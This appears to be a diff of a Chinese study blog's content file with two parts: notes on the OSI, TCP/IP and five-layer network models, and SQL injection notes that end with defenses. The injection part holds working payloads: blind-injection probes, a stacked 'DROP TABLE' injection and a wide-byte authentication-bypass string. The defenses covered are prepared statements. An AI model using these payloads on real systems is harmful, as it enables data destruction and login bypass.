+<h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><ul>
+<li>网络体系结构是从<strong>功能</strong>上描述计算机网络结构</li>
+<li>计算机网络体系结构简称网络体系结构是<strong>分层结构</strong></li>
+<li>每层遵守某个/些<strong>网络协议</strong>以完成本层功能</li>
+<li>计算机网络体系结构是计算机网络的各层及其协议的集合</li>
+<li>第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能</li>
+<li>仅仅在相邻层间有接口，且所提供的服务的具体实现细节对上一层完全屏蔽（透明）</li>
+<li>体系结构是<strong>抽象</strong>的，而实现是指能运行的一些软件和硬件</li>
+</ul>
+<h1 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h1><h3 id="7层OSI参考模型"><a href="#7层OSI参考模型" class="headerlink" title="7层OSI参考模型"></a>7层OSI参考模型</h3><p>目标：支持异构网络系统的互联互通</p>
+<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20221231165655402-16727928342534.png" alt="image-20221231165655402" style="zoom:80%;"></p>
+<h3 id="ISO-OSI参考模型解释通信过程"><a href="#ISO-OSI参考模型解释通信过程" class="headerlink" title="ISO/OSI参考模型解释通信过程"></a>ISO/OSI参考模型解释通信过程</h3><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102091707835-16727928362615.png" alt="image-20230102091707835"></p>
+<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>所有能和用户交互产生网络流量的程序（eg：qq，163邮箱）</p>
+<h4 id="典型应用层服务："><a href="#典型应用层服务：" class="headerlink" title="典型应用层服务："></a>典型应用层服务：</h4><p>文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p>
+<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理在两个通信系统中交换信息的表示方式（语法和语义）</p>
+<p>功能一：数据格式变换<br>功能二：数据加密解密<br>功能三：数据压缩和恢复</p>
+<h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供建立连接并在连接上有序的传输数据。<br>这是绘画，也是<strong>建立同步</strong>（SYN）</p>
+<p>功能一：建立、管理、终止会话<br>功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。<br>——适用于传输大文件</p>
+<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或用户数据报。</p>
+<p>功能一：可靠传输、不可靠传输<br>功能二：差错控制<br>功能三：流量控制<br>功能四：复用分用</p>
+<p>主要协议：TCP，UDP</p>
+<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层成本传输单位是数据报</p>
+<p>功能一：路由选择<br>功能二：流量控制<br>功能三：差错控制<br>功能四：拥塞控制</p>
+<p>主要协议：IP、IPX、ICMP</p>
+<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要任务是把网络层传下来的数据报组装成帧。<br>数据链路层的传输单位是帧</p>
+<p>功能一：成帧（定义帧的开始和结束）<br>功能二：差错控制<br>功能三：流量控制<br>功能四：访问（接入）控制：控制对信道的访问</p>
+<p>主要协议：PPP</p>
+<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在物理媒体上实现比特流的透明传输<br>物理层传输单位是比特</p>
+<p>透明传输：指不管所传数据是什么样的比特组合，都应当能够在链路上传送</p>
+<p>功能一：定义接口特性<br>功能二：定义传输模式（单工、半双工、双工）<br>功能三：定义传输速率<br>功能四：比特同步<br>功能五：比特编码</p>
+<p>主要协议：Rj45、802.3</p>
+<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153143474-16727928405746.png" alt="image-20230102153143474"></p>
+<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102153652377-16727928423557.png" alt="image-20230102153652377"></p>
+<h2 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h2><p>应用层：支持各种网络应用————FTP、SMTP、HTTP<br>传输层：进程-进程的数据传输————TCP、UDP<br>网络层：源主机到目的主机的数据分组路由与转发————IP、ICMP、OSPF<br>数据链路层：把网络层传下来的数据报组装成帧————Ethernet、PPP<br>物理层：比特传输</p>
+<p><img src="/2022/12/31/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20230102154506552-16727928450328.png" alt="image-20230102154506552"></p>
 ]]></content>
       <categories>
         <category>计算机网络</category>
@@ -4015,7 +4369,26 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
 <p>语法：1’and length(substr((select user from users limit 0,1),1))=’X        X为第一个字段值长度，第二、三个字段值更换limit函数参数<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171129966.png" alt><br>如图所示，users字段值中第一个字段值长度为5</p>
 <p>语法：1’and ascii(substr((select user from users limit 0,1),1,1))=’X             X为第一个字段值第一个字符的ascll码<br><img src="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/image-20220818171222053.png" alt></p>
 <p>注：password表中得到的是md5加密后的结果需要自行解密</p>
-]]></content>
+<h2 id="堆叠"><a href="#堆叠" class="headerlink" title="堆叠"></a>堆叠</h2><p>假设应用程序在执行SQL查询时使用了以下代码：</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line"><span class="keyword">SELECT</span> column1 <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> column2 = <span class="string">&#x27;input&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>攻击者可以通过注入恶意的输入来构造一个堆叠攻击，例如：</p>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">cssCopy code</span><br><span class="line"><span class="keyword">input</span>&#x27; ; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">table</span> ; --</span><br></pre></td></tr></table></figure>
+<p>在这个示例中，攻击者在输入的末尾添加了分号和额外的SQL语句（DROP TABLE），并使用注释符号（—）注释掉原始查询的剩余部分。当应用程序执行这个SQL查询时，数据库会一次执行多个语句，包括原始查询和额外的恶意语句。</p>
+<h2 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h2><p>X-Forwarded-For（XFF）头部可以被攻击者利用来伪造或隐藏其真实的IP地址。这种情况可能发生在应用程序没有适当地验证和处理XFF头部的情况下。</p>
+<p>攻击者可以通过在XFF头部中插入恶意的数据来尝试欺骗应用程序的安全机制。例如，他们可以尝试在XFF头部中注入恶意的SQL语句或攻击载荷，以绕过输入过滤和验证，并执行恶意的SQL注入攻击。</p>
+<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p>假设应用程序使用以下SQL查询来验证用户的用户名和密码：</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>攻击者可以在用户名和密码字段中注入宽字节编码的恶意输入，如下所示：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">makefileCopy</span> codeUsername: admin%bf%<span class="number">27</span> OR <span class="number">1</span>=<span class="number">1</span> --</span><br><span class="line"><span class="attribute">Password</span>: anything</span><br></pre></td></tr></table></figure>
+<p>在这个示例中，攻击者在用户名字段中注入了宽字节编码的<code>%bf%27</code>，它被解析为单引号（’）字符。这样，SQL查询的条件变为<code>username = &#39;admin&#39; OR 1=1 --&#39;</code>，使得条件始终为真，绕过了用户名和密码的验证。</p>
+<h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><ol>
+<li>准备预编译语句：在编写SQL查询时，使用占位符（如<code>?</code>或命名参数）代替动态的查询值。这样，SQL查询成为一个模板，其中包含了占位符而不是实际的用户输入。</li>
+<li>准备并绑定参数：在执行SQL查询之前，使用数据库的预编译功能准备预编译语句。然后，将实际的用户输入值绑定到预编译语句的占位符上。绑定参数会自动进行适当的转义和处理，确保用户输入被视为数据而不是SQL代码。</li>
+</ol>
+<p>下面是一个使用预编译语句的示例（使用PHP的PDO扩展）：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">phpCopy code<span class="regexp">//</span> 准备预编译语句</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&#x27;SELECT * FROM users WHERE username = ? AND password = ?&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 绑定参数并执行查询</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute([<span class="variable">$username</span>, <span class="variable">$password</span>]);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 获取结果</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br></pre></td></tr></table></figure>
+<p>在上述示例中，使用了两个占位符（<code>?</code>）作为查询的参数。然后，使用<code>execute()</code>方法将实际的用户名和密码绑定到占位符上。</p>
+<h2 id="正则表达式过滤"><a href="#正则表达式过滤" class="headerlink" title="正则表达式过滤"></a>正则表达式过滤</h2><h2 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h2><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2>]]></content>
       <categories>
         <category>web攻防</category>
       </categories>
